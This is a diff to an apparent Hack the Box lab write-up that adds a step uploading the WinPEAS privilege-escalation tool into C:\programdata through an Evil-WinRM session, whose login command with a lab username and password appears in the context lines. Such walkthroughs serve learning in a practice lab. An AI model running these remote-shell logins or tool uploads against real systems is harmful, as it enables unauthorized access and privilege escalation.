@@ -177,3 +177,9 @@ EvilWinRM
 evil-winrm -i 10.10.11.106 -u tony -p liltony -s scripts -e exes
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/20174a10-f48e-4cfc-b648-aa77144eba46)
+
+Upload WinPEAS
+Switch to the `C"\programdata` directory and upload `WinPEASany.exe`
+```CSS
+*Evil-WinRM* PS C:\programdata> upload winPEASany.exe
+```
